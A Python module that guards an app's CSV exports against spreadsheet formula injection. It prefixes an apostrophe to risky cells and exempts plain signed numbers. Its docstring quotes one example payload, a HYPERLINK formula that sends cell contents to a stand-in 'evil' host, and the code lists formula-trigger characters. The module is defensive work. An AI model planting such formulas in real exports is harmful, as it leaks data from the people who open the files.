"""CSV formula-injection neutralisation, shared by every CSV this app emits.

**RFC 4180 quoting is not a defence.** ``csv.writer`` escapes commas, quotes and
newlines correctly, and a cell reading ``=HYPERLINK("http://evil/"&A1,"click")``
survives that round trip perfectly intact -- whereupon Excel, LibreOffice and
Google Sheets all *evaluate* it on open. The exports' own docstring cited its
RFC 4180 correctness as though it settled the question; it settles a different
one.

The values at risk are not hypothetical. ``printers.model``, ``hostname``,
``serial`` and ``brand`` are SNMP strings read off devices sitting on client
LANs, so anyone who controls a printer controls those bytes -- and they land in
the monthly billing CSV that an MSP opens by hand, plus every operator-facing
export. Client/site names, ``location`` and ``asset_tag`` are operator
free-text, which is a smaller but non-zero surface.

The rule, stated once so both producers share it:

* **A number is never touched.** Real ``int`` / ``float`` / ``Decimal`` cells
  pass straight through, and so does a *string* that is a plain numeric literal
  (``-5``, ``+3``, ``-1.5e-3``). This is the entire reason the rule is not
  simply "anything starting with ``-``": page counts, mono/colour meters, supply
  levels and the period deltas planned for the billing CSV are legitimately
  signed numbers, and turning ``-5`` into text breaks the downstream billing
  import the file exists to feed. The exemption is safe because a string
  matching the numeric-literal grammar below cannot be a formula in any
  spreadsheet -- there is nothing to evaluate. The grammar is a closed-form
  regex rather than ``float()`` on purpose: ``float`` also accepts ``-inf``,
  ``-nan`` and ``-1_0``, none of which is a number to a spreadsheet.
* **Everything else whose first character is risky gets a leading apostrophe.**
  Risky means OWASP's set -- ``=`` ``+`` ``-`` ``@``, TAB (0x09), CR (0x0D),
  LF (0x0A) -- plus the full-width variants OWASP notes fire in some locales.
  Only the *first* character matters: a formula has to begin the cell.

Why the apostrophe rather than OWASP's alternative of a leading TAB: it is the
more widely implemented of the two, it is self-explanatory to an operator who
opens the file in a text editor (an invisible tab is not), and it does not
inject whitespace into a value a PSA bulk-import may be matching on. Both
change the bytes -- any neutralisation must -- and OWASP is explicit that no
strategy is universal across every spreadsheet and every downstream consumer.
This one stops the payload from executing, which is the property being bought.

Use ``safe_writer(fileobj)`` in place of ``csv.writer(fileobj)``. It is a
drop-in that neutralises **every** cell on the way out, header included, so a
column added later is covered by construction rather than by the author of that
column remembering. Per-cell hand-wrapping was the alternative and is exactly
the shape that drifts.
"""

from __future__ import annotations

import csv
import re
from decimal import Decimal
from typing import Any, Iterable, List

__all__ = ["RISKY_LEADING_CHARS", "neutralise_cell", "safe_writer"]

#: Leading characters that make a spreadsheet treat a cell as a formula.
#: OWASP's list (``=`` ``+`` ``-`` ``@``, TAB, CR, LF) plus the full-width
#: forms it flags as firing in some locales.
#: Spelled as escapes, not literals, so the file stays pure ASCII on a checkout
#: whose encoding is not UTF-8 (this repo has already been bitten by that).
RISKY_LEADING_CHARS = frozenset(
    "=+-@"
    "\t\r\n"
    "\uFF1D\uFF0B\uFF0D\uFF20"  # fullwidth = + - @
)

# A plain decimal literal: optional sign, digits with optional fraction,
# optional exponent. Deliberately rejects inf/nan/underscores/hex -- see module
# docstring. Anything matching this is a number to every spreadsheet, so it is
# exempt even though it may begin with '-' or '+'.
#
# Anchored with ``\Z``, NOT ``$``: in Python ``$`` also matches immediately
# before a trailing newline, so ``"-5\n"`` would satisfy this pattern and be
# handed back unmodified. Nothing exploitable follows from that one specific
# string -- a bare number plus a newline is not a formula anywhere -- but the
# exemption is the one hole deliberately left in the neutraliser, and an
# exemption that quietly accepts a character class it was never meant to is how
# the next hole gets found by somebody else.
_NUMERIC_LITERAL = re.compile(
    r"^[+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d+)?\Z"
)

# csv.writer renders these itself and can never produce a formula from them.
_NUMERIC_TYPES = (int, float, Decimal)


def neutralise_cell(value: Any) -> Any:
    """Return ``value`` made safe to write into a CSV cell.

    Non-risky values are returned *unchanged* (not stringified), so the bytes
    ``csv.writer`` emits are identical to what it would have emitted before.
    """
    if value is None:
        return value  # csv.writer renders None as an empty field
    if isinstance(value, _NUMERIC_TYPES):
        return value  # includes bool, which renders as True/False
    text = value if isinstance(value, str) else str(value)
    if not text or text[0] not in RISKY_LEADING_CHARS:
        return value
    if _NUMERIC_LITERAL.match(text):
        return value  # "-5" is a number, not a formula
    return "'" + text


def neutralise_row(row: Iterable[Any]) -> List[Any]:
    """Neutralise every cell of one row."""
    return [neutralise_cell(cell) for cell in row]


class _SafeWriter:
    """``csv.writer`` with :func:`neutralise_cell` applied to every cell.

    Wraps rather than subclasses because ``csv.writer`` returns an opaque
    C-implemented object that cannot be subclassed.
    """

    __slots__ = ("_writer",)

    def __init__(self, writer: Any) -> None:
        self._writer = writer

    @property
    def dialect(self) -> Any:
        return self._writer.dialect

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow(neutralise_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


def safe_writer(fileobj: Any, **kwargs: Any) -> _SafeWriter:
    """Drop-in for ``csv.writer`` that neutralises formula payloads.

    Every cell of every row -- including the header -- goes through
    :func:`neutralise_cell`, so neutralisation cannot be bypassed by adding a
    column.
    """
    return _SafeWriter(csv.writer(fileobj, **kwargs))
